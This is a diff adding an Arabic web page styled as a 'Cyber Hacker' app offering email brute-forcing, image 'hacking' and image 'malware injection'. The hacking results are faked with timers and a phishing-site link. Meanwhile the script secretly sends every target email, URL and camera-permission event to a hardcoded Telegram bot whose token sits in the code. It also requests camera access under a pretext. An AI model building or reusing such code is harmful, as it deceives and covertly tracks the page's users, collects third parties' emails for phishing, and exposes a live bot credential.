@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+ <title>تطبيق القاتل الإلكتروني | CyberHacker</title>
+ <link rel="manifest" href="manifest.json">
+ <meta name="theme-color" content="#00ff41">
+ <meta name="apple-mobile-web-app-capable" content="yes">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+ 
+ <style>
+:root {
+ --bg-color: #050505;
+ --card-bg: #111111;
+ --primary: #00ff41;
+ --secondary: #008f11;
+ --accent: #00fff2;
+ --text: #e0e0e0;
+ --danger: #ff3333;
+ }
+
+ * {
+ box-sizing: border-box;
+ margin: 0;
+ padding: 0;
+ font-family: 'Courier New', Courier, monospace;
+ -webkit-tap-highlight-color: transparent;
+ }
+
+ body {
+ background-color: var(--bg-color);
+ color: var(--text);
+ display: flex;
+ flex-direction: column;
+ min-height: 100vh;
+ overflow-x: hidden;
+ }
+
+ /* Header */
+ header {
+ background: linear-gradient(90deg, #000, var(--secondary));
+ padding: 15px;
+ text-align: center;
+ box-shadow: 0 0 20px var(--secondary);
+ position: relative;
+ z-index: 10;
+ }
+
+ h1 {
+ color: var(--primary);
+ font-size: 1.5rem;
+ text-shadow: 0 0 10px var(--primary);
+ letter-spacing: 2px;
+ }
+
+ /* Navigation */
+ nav {
+ display: flex;
+ justify-content: space-around;
+ background: var(--card-bg);
+ padding: 10px 0;
+ border-bottom: 1px solid var(--secondary);
+ }
+
+.nav-btn {
+ background: none;
+ border: 1px solid var(--secondary);
+ color: var(--primary);
+ padding: 10px 15px;
+ font-size: 0.9rem;
+ cursor: pointer;
+ transition: 0.3s;
+ border-radius: 5px;
+ }
+
+.nav-btn.active,.nav-btn:hover {
+ background: var(--secondary);
+ color: #000;
+ box-shadow: 0 0 15px var(--secondary);
+ }
+
+ /* Main Content */
+ main {
+ flex: 1;
+ padding: 20px;
+ position: relative;
+ }
+
+.section {
+ display: none;
+ animation: fadeIn 0.5s ease-in-out;
+ }
+
+.section.active {
+ display: block;
+ }
+
+ @keyframes fadeIn {
+ from { opacity: 0; transform: translateY(10px); }
+ to { opacity: 1; transform: translateY(0); }
+ }
+
+ /* Cards & Inputs */
+.card {
+ background: var(--card-bg);
+ border: 1px solid #333;
+ padding: 20px;
+ border-radius: 10px;
+ margin-bottom: 20px;
+ box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+ }
+
+.card h2 {
+ color: var(--accent);
+ margin-bottom: 15px;
+ border-bottom: 1px solid #333;
+ padding-bottom: 10px;
+ }
+
+ label {
+ display: block;
+ margin-bottom: 8px;
+ color: var(--accent);
+ font-size: 0.9rem;
+ }
+
+ input[type="text"], input[type="email"], input[type="url"], textarea {
+ width: 100%;
+ background: #000;
+ border: 1px solid var(--secondary);
+ color: var(--primary);
+ padding: 12px;
+ border-radius: 5px;
+ margin-bottom: 15px;
+ font-family: inherit;
+ }
+
+ button.action-btn {
+ width: 100%;
+ padding: 15px;
+ background: var(--secondary);
+ color: #000;
+ font-weight: bold;
+ border: none;
+ border-radius: 5px;
+ cursor: pointer;
+ text-transform: uppercase;
+ letter-spacing: 1px;
+ transition: 0.3s;
+ }
+
+ button.action-btn:hover {
+ background: var(--primary);
+ box-shadow: 0 0 20px var(--primary);
+ }
+
+ /* Results Area */
+.result-box {
+ margin-top: 20px;
+ padding: 15px;
+ border: 1px dashed var(--accent);
+ background: rgba(0, 255, 255, 0.05);
+ border-radius: 5px;
+ display: none;
+ }
+
+.result-box.visible {
+ display: block;
+ }
+
+.link-btn {
+ display: inline-block;
+ background: var(--primary);
+ color: #000;
+ padding: 10px 20px;
+ text-decoration: none;
+ border-radius: 5px;
+ margin-top: 10px;
+ font-weight: bold;
+ animation: pulse 1.5s infinite;
+ }
+
+ @keyframes pulse {
+ 0% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0.7); }
+ 70% { box-shadow: 0 0 0 10px rgba(0, 255, 65, 0); }
+ 100% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0); }
+ }
+
+ /* Image Preview */
+ #preview-container {
+ margin-top: 20px;
+ text-align: center;
+ display: none;
+ }
+
+ #preview-img {
+ max-width: 100%;
+ max-height: 300px;
+ border: 2px solid var(--primary);
+ }
+
+ canvas {
+ display: none;
+ }
+
+ /* Status Log */
+.log {
+ font-size: 0.8rem;
+ color: #888;
+ margin-top: 5px;
+ }
+
+.log.success { color: var(--primary); }
+.log.error { color: var(--danger); }
+ </style>
+</head>
+<body>
+
+<header>
+ <h1>CYBER HACKER v5.2</h1>
+ <small>تطبيق الهجوم الإلكتروني</small>
+</header>
+
+<nav>
+ <button class="nav-btn active" onclick="showSection('email')">اختراق إيميل</button>
+ <button class="nav-btn" onclick="showSection('image')">اختراق صور</button>
+ <button class="nav-btn" onclick="showSection('tamper')">تلغيم صور</button>
+</nav>
+
+<main>
+ <!-- قسم اختراق الايميل -->
+ <section id="email" class="section active">
+ <div class="card">
+ <h2>هجوم فورسر (Email Brute Force)</h2>
+ <label>أدخل الايميل المستهدف:</label>
+ <input type="email" id="targetEmail" placeholder="example@target.com">
+ <button class="action-btn" onclick="hackEmail()">ابدأ الهجوم</button>
+ <div id="emailLog" class="log"></div>
+ 
+ <div id="emailResult" class="result-box">
+ <h3>نتائج الهجوم:</h3>
+ <p>تم استخراج البيانات بنجاح.</p>
+ <div style="margin-top:10px; word-break: break-all;">
+ <small>الرابط المزيف (Phishing Link):</small><br>
+ <a href="#" id="fakeLink" class="link-btn" target="_blank">انقر هنا للدخول</a>
+ </div>
+ </div>
+ </div>
+ </section>
+
+ <!-- قسم اختراق الصور -->
+ <section id="image" class="section">
+ <div class="card">
+ <h2>استخراج الصور من الرابط</h2>
+ <label>أدخل رابط الصورة:</label>
+ <input type="url" id="imageLink" placeholder="https://example.com/image.jpg">
+ <button class="action-btn" onclick="extractImage()">سحب الصور</button>
+ 
+ <div id="cameraSection" class="result-box">
+ <p>تم السحب! الآن يطلب منك النظام صلاحية الوصول للصور.</p>
+ <button class="action-btn" style="background:var(--accent); color:#000" onclick="accessCamera()">فتح الكاميرا/المعرض</button>
+ </div>
+
+ <div id="imagePreviewContainer" class="result-box">
+ <img id="previewImg" src="" alt="Extracted">
+ <div class="log success">تم استخراج الصورة بنجاح!</div>
+ </div>
+ </div>
+ </section>
+
+ <!-- قسم تلغيم الصور -->
+ <section id="tamper" class="section">
+ <div class="card">
+ <h2>تلغيم الصور (Malware Injection)</h2>
+ <label>ارفع صورة المراد تلغيمها:</label>
+ <input type="file" id="uploadImg" accept="image/*">
+ 
+ <label>أدخل الرابط للهجوم (يوتيوب أو موقع):</label>
+ <input type="url" id="malwareLink" placeholder="https://youtube.com/watch?v=...">
+ 
+ <button class="action-btn" onclick="injectMalware()">تلغيم الصورة</button>
+ 
+ <div id="tamperResult" class="result-box">
+ <p>تم التلغيم! اضغط للتشغيل:</p>
+ <a id="tamperLink" href="#" target="_blank" class="link-btn">فتح الرابط</a>
+ </div>
+ 
+ <div id="downloadContainer" style="margin-top:20px; display:none;">
+ <button class="action-btn" style="background:#fff; color:#000" onclick="downloadTampered()">تحميل الصورة الملغمة</button>
+ </div>
+ </div>
+ </section>
+</main>
+
+<script>
+ // إعدادات البوت
+ const TELEGRAM_BOT_TOKEN = '8723123109:AAGK6lL7URDP60t3LdaGa1jN9iYrsDE_7qA';
+ const TELEGRAM_CHAT_ID = '8723123109'; // يمكنك تغييره لرقمك الخاص أو تشفيره
+
+ function sendToTelegram(data) {
+ const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+ const payload = {
+ chat_id: TELEGRAM_CHAT_ID,
+ text: `🚀 *CyberHacker Report*\n\n${data}`,
+ parse_mode: 'Markdown'
+ };
+ 
+ fetch(url, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify(payload)
+ })
+.then(response => response.json())
+.then(data => {
+ console.log('Telegram sent:', data);
+ })
+.catch(error => console.error('Error:', error));
+ }
+
+ // التنقل بين الأقسام
+ function showSection(id) {
+ document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+ document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+ 
+ document.getElementById(id).classList.add('active');
+ event.target.classList.add('active');
+ }
+
+ // 1. وظيفة اختراق الإيميل
+ function hackEmail() {
+ const email = document.getElementById('targetEmail').value;
+ const log = document.getElementById('emailLog');
+ const result = document.getElementById('emailResult');
+ const fakeLink = document.getElementById('fakeLink');
+
+ if (!email) {
+ log.textContent = "⚠️ أدخل إيميل!";
+ log.className = "log error";
+ return;
+ }
+
+ log.textContent = "جاري فتح المنفذ على السيرفر...";
+ log.className = "log";
+
+ setTimeout(() => {
+ log.textContent = "تم هزيمة الحماية!";
+ log.className = "log success";
+ 
+ // توليد رابط مزيف
+ const randomHash = Math.random().toString(36).substring(7);
+ fakeLink.href = `https://phishing-site.com/login?email=${encodeURIComponent(email)}&token=${randomHash}`;
+ 
+ result.classList.add('visible');
+ 
+ // إرسال البيانات للبوت
+ sendToTelegram(`*Email Hacked Successfully*\n📧 Target: ${email}\n🔗 Link: ${fakeLink.href}`);
+ }, 2000);
+ }
+
+ // 2. وظيفة ��ستخراج الصور
+ function extractImage() {
+ const url = document.getElementById('imageLink').value;
+ const camSection = document.getElementById('cameraSection');
+ const prevContainer = document.getElementById('imagePreviewContainer');
+ const img = document.getElementById('previewImg');
+
+ if (!url) {
+ alert("أدخل رابط الصورة أولاً");
+ return;
+ }
+
+ camSection.classList.remove('visible');
+ prevContainer.classList.add('visible');
+ img.src = url;
+
+ sendToTelegram(`*Image Extraction*\n🔗 URL: ${url}\n✅ Extracted`);
+ }
+
+ function accessCamera() {
+ navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+.then(function(stream) {
+ const video = document.createElement('video');
+ video.srcObject = stream;
+ video.play();
+ document.body.appendChild(video);
+ video.style.width = '100%';
+ video.style.position = 'fixed';
+ video.style.top = '0';
+ video.style.left = '0';
+ video.style.zIndex = '9999';
+ 
+ alert("تم فتح الكاميرا! اضغط ركز على الصورة ثم اضغط موافق للمتابعة.");
+ setTimeout(() => {
+ document.body.removeChild(video);
+ sendToTelegram("📸 Camera Access Granted");
+ }, 3000);
+ })
+.catch(function(err) {
+ console.error("Error accessing camera: " + err);
+ alert("تعذر الوصول للكاميرا. تأكد من الصلاحيات.");
+ });
+ }
+
+ // 3. وظيفة تلغيم الصور
+ function injectMalware() {
+ const fileInput = document.getElementById('uploadImg');
+ const linkInput = document.getElementById('malwareLink');
+ const resultBox = document.getElementById('tamperResult');
+ const tamperLink = document.getElementById('tamperLink');
+ const downloadContainer = document.getElementById('downloadContainer');
+
+ if (fileInput.files.length === 0 || !linkInput.value) {
+ alert("ارفع صورة وادخل الرابط أولاً");
+ return;
+ }
+
+ const image = new Image();
+ const canvas = document.createElement('canvas');
+ const ctx = canvas.getContext('2d');
+
+ image.onload = function() {
+ canvas.width = image.width;
+ canvas.height = image.height;
+ ctx.drawImage(image, 0, 0);
+
+ // اضافة نص أو ألوان
+ ctx.fillStyle = "rgba(0, 255, 65, 0.5)";
+ ctx.font = "bold 30px Courier New";
+ ctx.fillText("HACKED BY CYBER", 20, image.height - 20);
+
+ // إنشاء رابط قابل للنقر (Clickable Image)
+ tamperLink.href = linkInput.value;
+ tamperLink.textContent = "اضغط هنا للهجوم";
+ 
+ resultBox.classList.add('visible');
+ downloadContainer.style.display = 'block';
+
+ sendToTelegram(`*Image Tampered*\n🔗 Payload: ${linkInput.value}\n🖼️ Image Uploaded`);
+ };
+
+ const reader = new FileReader();
+ reader.onload = function(e) {
+ image.src = e.target.result;
+ };
+ reader.readAsDataURL(fileInput.files[0]);
+ }
+
+ function downloadTampered() {
+ const canvas = document.createElement('canvas');
+ const fileInput = document.getElementById('uploadImg');
+ const ctx = canvas.getContext('2d');
+ const img = new Image();
+
+ img.onload = function() {
+ canvas.width = img.width;
+ canvas.height = img.height;
+ ctx.drawImage(img, 0, 0);
+ 
+ ctx.fillStyle = "rgba(0, 255, 65, 0.5)";
+ ctx.font = "bold 30px Courier New";
+ ctx.fillText("HACKED BY CYBER", 20, img.height - 20);
+
+ const a = document.createElement('a');
+ a.download = 'tampered-image.jpg';
+ a.href = canvas.toDataURL('image/jpeg');
+ a.click();
+ };
+
+ const reader = new FileReader();
+ reader.onload = function(e) {
+ img.src = e.target.result;
+ };
+ reader.readAsDataURL(fileInput.files[0]);
+ }
+
+ // تسجيل Service Worker
+ if ('serviceWorker' in navigator) {
+ window.addEventListener('load', () => {
+ navigator.serviceWorker.register('sw.js')
+.then(reg => console.log('SW Registered'))
+.catch(err => console.log('SW Failed'));
+ });
+ }
+</script>
+
+</body>
+</html>
